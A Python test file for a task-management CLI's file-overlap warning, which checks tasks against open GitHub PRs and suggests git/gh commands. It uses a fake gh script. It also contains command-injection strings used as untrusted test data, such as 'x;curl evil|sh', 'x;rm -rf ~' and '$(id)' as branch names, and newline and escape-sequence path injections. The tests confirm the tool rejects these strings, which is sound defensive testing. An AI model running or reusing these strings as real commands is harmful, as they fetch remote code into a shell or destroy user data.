#!/usr/bin/env python3
"""Пересечение файлов внутри направления перед раздачей (metis-0665): `pantheon task overlap ID` и предупреждение при
`task set ID status=doing` / `task claim` — touches задачи против живых (doing, review) задач своего направления и
файлов открытых PR его репозиториев ([merge_repos] policy.toml). Вывод — с чем пересекается, какие файлы, и выбор с
готовыми командами: очередь (ждать слияния PR) или ветка от ветки PR (stacked PR, argus только на дельту). gh не
ответил — кэш планового прохода или строка «не проверено», не молчание. Предупреждение, не отказ: код 0, запись сделана.
gh подделан скриптом (PANTHEON_GH).

Запуск: python3 -I plugins/pantheon/tests/test_task_overlap.py  (код выхода 0 — все прошли)
"""
import atexit
import json
import os
import shutil
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _py311 import PY311  # CLI pantheon — только на Python 3.11+

_ROOT = tempfile.mkdtemp(prefix="overlap-root-")
tempfile.tempdir = _ROOT
os.environ["TMPDIR"] = _ROOT
atexit.register(shutil.rmtree, _ROOT, True)

LIB = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "lib")
RUN_PY = os.path.join(LIB, "run.py")
sys.path.insert(0, LIB)
import tasks as T  # noqa: E402
import autoclose as A  # noqa: E402

T0 = 1_793_000_000
results = []


def check(name, ok, detail=""):
    results.append(bool(ok))
    print(("ok  " if ok else "FAIL") + " " + name + ("" if ok or not detail else f"  [{detail}]"))


FAKE_GH = """#!/bin/sh
d="$FAKE_GH_DIR"; repo=""; prev=""
echo "$@" >> "$d/calls.log"
if [ -f "$d/fail" ]; then
  if [ -s "$d/fail" ]; then cat "$d/fail" >&2; else echo "error connecting to api.github.com" >&2; fi
  exit 1
fi
for a in "$@"; do
  case "$prev" in -R|--repo) repo="$a";; esac
  prev="$a"
done
if [ "$1 $2" = "pr list" ]; then
  f="$d/$(echo "$repo" | tr / _).json"
  [ -f "$f" ] && cat "$f" || echo "[]"
  exit 0
fi
exit 1
"""

DIRS = '[[direction]]\nname = "metis-pantheon"\nproject = "Пантеон"\n\n[[direction]]\nname = "demo"\nproject = "Демо"\n'
POLICY = '[merge_repos]\nmetis-pantheon = ["latark/agent-kit"]\ndemo = ["acme/site"]\n'
GATE, MERGE = "plugins/guard/hooks/merge_gate.py", "plugins/pantheon/lib/merge.py"


def make(policy=POLICY):
    tmp = os.path.realpath(tempfile.mkdtemp(prefix="overlap-test-"))
    home, state, view, gh = (os.path.join(tmp, x) for x in ("pantheon", "state", "view", "gh"))
    for d in ("directions/metis-pantheon/tasks", "directions/demo/tasks", "inbox/tasks"):
        os.makedirs(os.path.join(home, d))
    for d in (view, gh, state, os.path.join(tmp, ".claude", "pantheon")):
        os.makedirs(d, exist_ok=True)
    open(os.path.join(home, "schedule.toml"), "w").write('primary_host = "mac-a"\n')
    open(os.path.join(home, "directions.toml"), "w", encoding="utf-8").write(DIRS)
    if policy is not None:
        open(os.path.join(tmp, ".claude", "pantheon", "policy.toml"), "w", encoding="utf-8").write(policy)
    with open(os.path.join(gh, "gh"), "w") as fh:
        fh.write(FAKE_GH)
    os.chmod(os.path.join(gh, "gh"), 0o755)
    env = {"PATH": os.environ["PATH"], "HOME": tmp, "PANTHEON_HOME": home, "PANTHEON_STATE": state,
           "PANTHEON_VIEW": view, "PANTHEON_HOST": "mac-a", "PANTHEON_DRYRUN": "1", "PANTHEON_NO_NOTIFY": "1",
           "PANTHEON_FAKE_IDLE": "0", "FAKE_GH_DIR": gh, "PANTHEON_GH": os.path.join(gh, "gh"), "TMPDIR": tmp,
           "PANTHEON_METRICS": "0"}
    return tmp, home, state, gh, env


def pan(env, *a):
    return subprocess.run([PY311, "-I", RUN_PY, *a], env=dict(env, PANTHEON_NOW=str(T0)), capture_output=True, text=True,
                          timeout=120)


def open_prs(env, direction="metis-pantheon"):
    """overlap_open_prs в отдельном процессе с подменённым HOME → (prs, notes)."""
    code = (f"import json, sys; sys.path.insert(0, {LIB!r}); import pantheon as P; "
            f"print(json.dumps(P.overlap_open_prs({direction!r})))")
    r = subprocess.run([PY311, "-I", "-c", code], env=dict(env, PANTHEON_NOW=str(T0)), capture_output=True, text=True,
                       timeout=120)
    return json.loads(r.stdout) if r.returncode == 0 else ([], [r.stderr[-300:]])


def put(home, direction, tid, status="todo", touches=None, **f):
    lines = ["---", "type: task", f"id: {tid}", f"title: Задача {tid}", f"status: {status}",
             f"project: {'Пантеон' if direction == 'metis-pantheon' else 'Демо'}", f"direction: {direction}",
             f"owner: {f.pop('owner', direction)}", "created: 2026-11-01", "updated: 2026-11-01T10:00:00",
             "schema_version: 1"]
    if touches:
        lines.append(f"touches: [{', '.join(touches)}]")
    for k, v in f.items():
        lines.append(f"{k}: {v}")
    lines += ["---", "", f"# Задача {tid}", "", "Текст.", "", "## Журнал", "", "- 2026-11-01 10:00 — агент: создана", ""]
    open(os.path.join(home, "directions", direction, "tasks", tid + ".md"), "w", encoding="utf-8").write("\n".join(lines))


def gh_prs(gh, repo, prs):
    open(os.path.join(gh, repo.replace("/", "_") + ".json"), "w").write(json.dumps(prs))


def calls(gh):
    p = os.path.join(gh, "calls.log")
    return open(p).read() if os.path.exists(p) else ""


PR248 = {"number": 248, "headRefName": "ci-billing-0655", "body": "Closes metis-0655",
         "files": [{"path": GATE}, {"path": MERGE}, {"path": "README.md"}]}
PR250 = {"number": 250, "headRefName": "other-0656", "body": "Closes metis-0656", "files": [{"path": "plugins/pantheon/lib/board.py"}]}


def pure():
    tasks = {
        "metis-0001": ("", {"type": "task", "direction": "metis-pantheon", "status": "todo",
                            "touches": ["plugins/guard/", MERGE], "depends_on": ["metis-0009"]}, ""),
        "metis-0002": ("", {"type": "task", "direction": "metis-pantheon", "status": "doing", "owner": "dev-a",
                            "touches": [GATE]}, ""),
        "metis-0003": ("", {"type": "task", "direction": "metis-pantheon", "status": "review", "touches": [MERGE]}, ""),
        "metis-0004": ("", {"type": "task", "direction": "metis-pantheon", "status": "todo", "touches": [GATE]}, ""),
        "metis-0005": ("", {"type": "task", "direction": "metis-pantheon", "status": "done", "touches": [GATE]}, ""),
        "demo-0001": ("", {"type": "task", "direction": "demo", "status": "doing", "touches": [GATE]}, ""),
        "metis-0006": ("", {"type": "story", "direction": "metis-pantheon", "status": "doing", "touches": [GATE]}, ""),
        "metis-0007": ("", {"type": "task", "direction": "metis-pantheon", "status": "doing", "touches": ["plugins/guardx"]}, ""),
    }
    got = T.overlap_tasks(tasks, "metis-0001")
    check("overlap_tasks: doing и review своего направления; todo, done, чужое направление, пачка, соседняя папка — нет",
          [g[0] for g in got] == ["metis-0002", "metis-0003"], got)
    check("overlap_tasks: общая область — более узкая (файл, а не папка задачи), owner и статус в строке",
          got[0] == ("metis-0002", "doing", "dev-a", [GATE]) and got[1][3] == [MERGE], got)
    tasks["metis-0001"][1]["touches"] = []
    check("overlap_tasks: без touches — пусто", T.overlap_tasks(tasks, "metis-0001") == [])
    tasks["metis-0001"][1]["touches"] = ["plugins/guard/", MERGE]
    head = tasks["metis-0001"][1]
    prs = [{"repo": "latark/agent-kit", "number": 248, "branch": "ci-billing-0655", "files": [GATE, MERGE, "README.md"],
            "ids": ["metis-0655"], "closes": ["metis-0655"]},
           {"repo": "latark/agent-kit", "number": 249, "branch": "mine-0001", "files": [GATE], "ids": ["metis-0001"], "closes": []},
           {"repo": "latark/agent-kit", "number": 251, "branch": "nofiles", "files": None, "ids": [], "closes": []},
           {"repo": "latark/agent-kit", "number": 252, "branch": "far", "files": ["docs/x.md"], "ids": [], "closes": []}]
    cp = T.overlap_prs("metis-0001", head, prs)
    check("overlap_prs: PR с общими файлами — с их списком; свой PR, PR без файлов и без пересечения — нет",
          [(p["number"], c) for p, c in cp] == [(248, sorted([GATE, MERGE]))], cp)
    text = "\n".join(T.overlap_text("metis-0001", head, got + [("metis-0655", "doing", "", [GATE])], cp))
    check("overlap_text: названы задачи и PR с файлами",
          "задача metis-0002 (doing, dev-a, открытого PR нет): " + GATE in text
          and "задача metis-0655 (doing, PR #248): " + GATE in text
          and f"PR #248 latark/agent-kit (ветка ci-billing-0655, metis-0655): {GATE}, {MERGE}" in text, text)
    for frag in ("gh pr view 248 -R latark/agent-kit --json state,mergedAt",
                 "git fetch origin && git switch -c metis-0001 origin/main",
                 "pantheon task set metis-0001 status=todo depends_on=metis-0009,metis-0655",
                 "git fetch origin && git switch -c metis-0001 origin/ci-billing-0655",
                 "gh pr create -R latark/agent-kit --base ci-billing-0655",
                 "argus — только дельта своего PR: git diff origin/ci-billing-0655...HEAD",
                 "после слияния #248 (--merge): gh pr edit <свой N> -R latark/agent-kit --base main — head тот же",
                 "конфликт с main — git merge origin/main, не rebase",
                 "#248 слит squash или rebase — «принять» на новый head не переносится",
                 "Без открытого PR: metis-0002, metis-0003 — очередь: pantheon task set metis-0001 status=todo "
                 "depends_on=metis-0009,metis-0002,metis-0003",
                 "это предупреждение, не запрет"):
        check(f"overlap_text: команда «{frag[:60]}»", frag in text, text)
    check("overlap_text: задача с открытым PR (metis-0655) — в блоке PR, не в «без открытого PR»",
          "metis-0655" not in [ln for ln in text.splitlines() if "Без открытого PR" in ln][0], text)
    check("overlap_text: пересечений нет и всё проверено — пусто", T.overlap_text("metis-0001", head, [], []) == [])
    notes = T.overlap_text("metis-0001", head, [], [], ["latark/agent-kit: gh не ответил (x)"])
    check("overlap_text: не проверенное не глушится и без пересечений", notes == ["не проверено: latark/agent-kit: gh не ответил (x)"], notes)
    nt = T.overlap_text("metis-0001", {"touches": []}, [], [])
    check("overlap_text: без touches — строка «нет touches» с командой", len(nt) == 1 and "нет touches" in nt[0]
          and "pantheon task set metis-0001 touches=" in nt[0], nt)

    # Ветка, репозиторий и пути PR — чужой текст: в команды — только по шаблону, пути с переводом строки — прочь
    for br in ("x;rm -rf ~", "a b", "-x", "a..b", "../main", "", "a" * 201, "a\nb", "ветка", "$(id)"):
        check(f"overlap_name_ok: ветка {br[:20]!r} отклонена", not T.overlap_name_ok(br, T.OVERLAP_BRANCH_RE))
    for br in ("ci-billing-0655", "feat/x.y_z-1", "a" * 200):
        check(f"overlap_name_ok: ветка {br[:20]!r} принята", T.overlap_name_ok(br, T.OVERLAP_BRANCH_RE))
    for rp in ("latark/agent-kit", "a/b.c_d"):
        check(f"overlap_name_ok: репозиторий {rp!r} принят", T.overlap_name_ok(rp, T.OVERLAP_REPO_RE))
    for rp in ("-R/x", "a/b/c", "a b/c", "a/..", "a", "a/b;c"):
        check(f"overlap_name_ok: репозиторий {rp!r} отклонён", not T.overlap_name_ok(rp, T.OVERLAP_REPO_RE))
    for bad in (GATE + "\nPR #1 push", "a\rb", "a\x1bb", "a\x7fb", "a\u2028b", "x" * 401, "", None):
        check(f"overlap_path_ok: путь {str(bad)[:20]!r} отброшен", not T.overlap_path_ok(bad))
    check("overlap_path_ok: обычный путь и путь в 400 знаков приняты",
          T.overlap_path_ok(GATE) and T.overlap_path_ok("p/" + "x" * 398))
    evil = [{"repo": "latark/agent-kit", "number": 300, "branch": "x;curl evil|sh", "ids": [], "closes": [],
             "files": [GATE, MERGE + "\n  Б — FORCEPUSH", "plugins/guard/\x1b[2Jx"]},
            {"repo": "-R/x", "number": 301, "branch": "-x", "files": [GATE], "ids": [], "closes": []},
            {"repo": "latark/agent-kit", "number": 302, "branch": "a..b", "files": [GATE], "ids": [], "closes": [], "dropped": 2}]
    cp = T.overlap_prs("metis-0001", head, evil)
    check("overlap_prs: пути с переводом строки и управляющим знаком отброшены, число — в dropped (с отброшенными раньше)",
          [(p["number"], c, p["dropped"]) for p, c in cp] == [(300, [GATE], 2), (301, [GATE], 0), (302, [GATE], 2)], cp)
    check("overlap_prs: ветка и репозиторий не по шаблону → None", [(p["branch"], p["repo"]) for p, _ in cp]
          == [(None, "latark/agent-kit"), (None, None), (None, "latark/agent-kit")], cp)
    check("overlap_prs: PR с номером не числом пропущен",
          T.overlap_prs("metis-0001", head, [dict(evil[0], number="1\n2"), dict(evil[0], number=True)]) == [])
    text = "\n".join(T.overlap_text("metis-0001", head, [], cp))
    check("overlap_text: отклонённая ветка не попала ни в одну строку, вместо неё <ветка PR>",
          "curl" not in text and "origin/-x" not in text and "--base -x" not in text and "a..b" not in text
          and "switch -c metis-0001 origin/<ветка PR>" in text and "--base <ветка PR>" in text, text)
    check("overlap_text: строка «имя ветки PR #300 отклонено», у #301 — и репозиторий",
          "имя ветки PR #300 отклонено" in text and "имя репозитория PR #301 отклонено" in text
          and "gh pr view 301 -R <репозиторий>" in text and "-R/x" not in text, text)
    check("overlap_text: путь из чужого PR не вставил строк — нет FORCEPUSH и ESC, есть «отброшено путей … 2»",
          "FORCEPUSH" not in text and "\x1b" not in text and "(отброшено путей не по форме: 2)" in text, text)


def cli():
    tmp, home, state, gh, env = make()
    put(home, "metis-pantheon", "metis-0001", touches=[GATE, "plugins/pantheon/lib/tasks.py"])
    put(home, "metis-pantheon", "metis-0655", status="doing", touches=[GATE, MERGE], owner="dev-b")
    put(home, "metis-pantheon", "metis-0010", status="todo", touches=["docs/"])
    put(home, "demo", "demo-0001", status="doing", touches=[GATE])
    gh_prs(gh, "latark/agent-kit", [PR248, PR250])
    gh_prs(gh, "acme/site", [dict(PR248, number=7)])
    r = pan(env, "task", "overlap", "metis-0001")
    check("task overlap: код 0, задача и PR #248 с файлом, ветка от ветки с готовой командой",
          r.returncode == 0 and "задача metis-0655 (doing, dev-b, PR #248)" in r.stdout
          and f"PR #248 latark/agent-kit (ветка ci-billing-0655, metis-0655): {GATE}" in r.stdout
          and "git switch -c metis-0001 origin/ci-billing-0655" in r.stdout and "#250" not in r.stdout, (r.stdout, r.stderr))
    check("task overlap: gh спрошен только про репозиторий своего направления, с файлами",
          "-R latark/agent-kit" in calls(gh) and "acme/site" not in calls(gh) and "files" in calls(gh), calls(gh))
    r = pan(env, "task", "overlap", "metis-0010")
    check("task overlap: пересечений нет — одна строка «пересечений … нет», код 0",
          r.returncode == 0 and "пересечений с живыми задачами направления и открытыми PR нет" in r.stdout, r.stdout)
    gh_prs(gh, "latark/agent-kit", [dict(PR248, headRefName="x y;id",
                                         files=[{"path": GATE}, {"path": GATE + "\n- задача metis-0001 (fake)"}])])
    r = pan(env, "task", "overlap", "metis-0001")
    check("task overlap: ветка из gh с пробелом и «;» отклонена, путь с \\n из gh отброшен — строк не вставил",
          r.returncode == 0 and "имя ветки PR #248 отклонено" in r.stdout and "x y;id" not in r.stdout
          and "(fake)" not in r.stdout and "(отброшено путей не по форме: 1)" in r.stdout
          and "origin/<ветка PR>" in r.stdout, r.stdout)
    rows = open_prs(env)
    check("overlap_open_prs сам отбрасывает путь с \\n из gh (не только overlap_prs), число — в dropped",
          [(p["number"], p["files"], p["dropped"]) for p in rows[0]] == [(248, [GATE], 1)], rows)
    gh_prs(gh, "latark/agent-kit", [PR248, PR250])
    r = pan(env, "task", "overlap", "metis-9999")
    check("task overlap: нет задачи — код 1", r.returncode == 1 and "нет задачи" in r.stderr, r.stderr)
    r = pan(env, "task", "overlap")
    check("task overlap без id — код 2", r.returncode == 2, r.stderr)

    # gh упал: кэша нет — сказано и названа ручная команда; кэш есть — PR из кэша и строка про кэш
    open(os.path.join(gh, "fail"), "w").close()
    r = pan(env, "task", "overlap", "metis-0001")
    check("gh упал, кэша нет: «не проверено: … gh не ответил (…)» с командой для ручной проверки, задача всё равно сверена",
          r.returncode == 0 and "не проверено: latark/agent-kit: gh не ответил (error connecting" in r.stdout
          and "gh pr list -R latark/agent-kit --state open --json number,headRefName,files" in r.stdout
          and "задача metis-0655" in r.stdout and "PR #248" not in r.stdout.replace("PR #248)", ""), r.stdout)
    cache = {"fetched": T0 - 600, "open_prs": {"latark/agent-kit": [
        {"number": 248, "head": "a" * 40, "branch": "ci-billing-0655", "files": [GATE], "ids": ["metis-0655"],
         "closes": ["metis-0655"], "part": False, "core": True},
        {"number": 228, "head": "b" * 40, "ids": [], "closes": [], "part": False, "core": True}]}}
    open(os.path.join(state, "autoclose-prs.json"), "w").write(json.dumps(cache))
    r = pan(env, "task", "overlap", "metis-0001")
    check("gh упал, кэш есть: PR #248 из кэша, строка «из кэша планового прохода от …», PR без файлов назван",
          r.returncode == 0 and "из кэша планового прохода от" in r.stdout and "без списка файлов: #228" in r.stdout
          and f"PR #248 latark/agent-kit (ветка ci-billing-0655, metis-0655): {GATE}" in r.stdout, r.stdout)
    cache["open_prs"]["latark/agent-kit"][0].update(branch="-x;id", files=[GATE, GATE + "\nevil line"],
                                                    ids=["metis-0655", "x\ny"], closes=["metis-0655\n; rm"])
    open(os.path.join(state, "autoclose-prs.json"), "w").write(json.dumps(cache))
    r = pan(env, "task", "overlap", "metis-0001")
    check("кэш с чужой веткой, путём с \\n и мусорными id: ветка отклонена, путь отброшен, id без перевода строки",
          r.returncode == 0 and "имя ветки PR #248 отклонено" in r.stdout and "-x;id" not in r.stdout
          and "evil line" not in r.stdout and "(отброшено путей не по форме: 1)" in r.stdout
          and "x\ny" not in r.stdout and "; rm" not in r.stdout, r.stdout)
    rows = open_prs(env)
    p248 = [p for p in rows[0] if p["number"] == 248]
    check("overlap_open_prs из кэша: путь с \\n отброшен (dropped 1), id не по шаблону — прочь",
          p248 and p248[0]["files"] == [GATE] and p248[0]["dropped"] == 1 and p248[0]["ids"] == ["metis-0655"]
          and p248[0]["closes"] == [], rows)
    open(os.path.join(gh, "fail"), "w").write("HTTP 502\n- задача metis-0001 (вставка)\x1b[2J\n")
    r = pan(env, "task", "overlap", "metis-0001")
    line = [ln for ln in r.stdout.splitlines() if "gh не ответил" in ln]
    check("ответ gh об ошибке с переводами строк и ESC — в одну строку, своих строк не вставил",
          r.returncode == 0 and line and "HTTP 502 - задача metis-0001 (вставка)" in line[0] and "\x1b" not in r.stdout
          and not any(ln.startswith("- задача metis-0001") for ln in r.stdout.splitlines()), r.stdout)
    os.remove(os.path.join(gh, "fail"))

    # task set status=doing — предупреждение в stderr, запись сделана, код 0
    os.remove(os.path.join(gh, "calls.log"))
    r = pan(env, "task", "set", "metis-0001", "priority=1")
    check("task set без status=doing — gh не зовётся, предупреждения нет",
          r.returncode == 0 and calls(gh) == "" and "предупреждение" not in r.stderr, (r.stderr, calls(gh)))
    r = pan(env, "task", "set", "metis-0001", "status=doing")
    head = T.read(os.path.join(home, "directions", "metis-pantheon", "tasks", "metis-0001.md"))[0]
    check("task set status=doing: код 0, статус записан, в stderr — пересечение и выбор с командами",
          r.returncode == 0 and head.get("status") == "doing"
          and "предупреждение · metis-0001 пересекается по файлам" in r.stderr and "PR #248" in r.stderr
          and "git switch -c metis-0001 origin/ci-billing-0655" in r.stderr, (r.stdout, r.stderr))
    r = pan(env, "task", "set", "metis-0010", "status=doing")
    check("task set status=doing без пересечений — без предупреждения", r.returncode == 0 and "предупреждение" not in r.stderr,
          r.stderr)
    put(home, "metis-pantheon", "metis-0011")
    r = pan(env, "task", "set", "metis-0011", "status=doing")
    check("task set status=doing без touches — одна строка-подсказка", r.returncode == 0
          and r.stderr.count("предупреждение ·") == 1 and "нет touches" in r.stderr, r.stderr)
    put(home, "metis-pantheon", "metis-0012", touches=[MERGE])
    r = pan(env, "task", "claim", "metis-0012", "--by", "dev-c")
    check("task claim: тоже предупреждает о пересечении", r.returncode == 0 and "пересекается по файлам" in r.stderr
          and "metis-0655" in r.stderr, r.stderr)

    # policy.toml нет — сказано, что открытые PR не проверены
    tmp2, home2, _, gh2, env2 = make(policy=None)
    put(home2, "metis-pantheon", "metis-0001", touches=[GATE])
    r = pan(env2, "task", "overlap", "metis-0001")
    check("нет policy.toml: «не проверено: нет …policy.toml», gh не зовётся",
          r.returncode == 0 and "не проверено: нет" in r.stdout and "policy.toml" in r.stdout and calls(gh2) == "", r.stdout)
    tmp4, home4, _, gh4, env4 = make(policy='[merge_repos]\nmetis-pantheon = ["-x/y", "a b/c", "latark/agent-kit"]\n')
    put(home4, "metis-pantheon", "metis-0001", touches=[GATE])
    gh_prs(gh4, "latark/agent-kit", [PR248])
    r = pan(env4, "task", "overlap", "metis-0001")
    check("[merge_repos] с именами не owner/name: они отклонены и не напечатаны, gh зовётся только с годным",
          r.returncode == 0 and "отклонено имён не owner/name: 2" in r.stdout and "-x/y" not in r.stdout
          and "a b/c" not in r.stdout and "-x/y" not in calls(gh4) and "-R latark/agent-kit" in calls(gh4)
          and "PR #248" in r.stdout, (r.stdout, calls(gh4)))
    tmp5, home5, _, gh5, env5 = make(policy='[merge_repos]\nmetis-pantheon = ["-x/y"]\n')
    put(home5, "metis-pantheon", "metis-0001", touches=[GATE])
    r = pan(env5, "task", "overlap", "metis-0001")
    check("[merge_repos] только с негодным именем: сказано, gh не зовётся",
          r.returncode == 0 and "отклонено имён не owner/name: 1" in r.stdout and calls(gh5) == "", r.stdout)
    tmp3, home3, _, gh3, env3 = make(policy='[merge_repos]\ndemo = ["acme/site"]\n')
    put(home3, "metis-pantheon", "metis-0001", touches=[GATE])
    r = pan(env3, "task", "overlap", "metis-0001")
    check("у направления нет [merge_repos]: сказано, gh не зовётся",
          r.returncode == 0 and "нет репозиториев в [merge_repos]" in r.stdout and calls(gh3) == "", r.stdout)


def fetch_cache():
    tmp, home, state, gh, env = make()
    # фальшивый gh отдаёт один и тот же список на merged и open: слитый без plugin.json fetch просто запомнит
    gh_prs(gh, "latark/agent-kit", [dict(PR248, headRefOid="c" * 40)])
    cache_file, state_file = os.path.join(state, "c.json"), os.path.join(state, "s.json")
    A.fetch(cache_file, state_file, T0, ["latark/agent-kit"], env=env)
    got = json.load(open(cache_file))["open_prs"]["latark/agent-kit"][0]
    check("autoclose fetch: open_prs несёт branch и files (кэш для сверки, когда gh в окне не отвечает)",
          got.get("branch") == "ci-billing-0655" and got.get("files") == [GATE, MERGE, "README.md"], got)
    gh_prs(gh, "latark/agent-kit", [dict(PR248, headRefOid="d" * 40, files=PR248["files"] + [
        {"path": "a\nb"}, {"path": "x" * 401}, {"path": "a\x1bb"}])])
    A.fetch(cache_file, state_file, T0 + 600, ["latark/agent-kit"], env=env)
    got = json.load(open(cache_file))["open_prs"]["latark/agent-kit"][0]
    check("autoclose fetch: пути с переводом строки, управляющим знаком и длиннее 400 в кэш не пишутся",
          got.get("files") == [GATE, MERGE, "README.md"], got)
    check("autoclose _path_ok и tasks.overlap_path_ok согласны",
          all(A._path_ok(x) == T.overlap_path_ok(x) for x in (GATE, "a\nb", "x" * 400, "x" * 401, "a\x7f", "a\u2029", "", None)))


def main():
    pure()
    cli()
    fetch_cache()
    print(f"\n{sum(results)}/{len(results)}")
    sys.exit(0 if all(results) else 1)


if __name__ == "__main__":
    main()
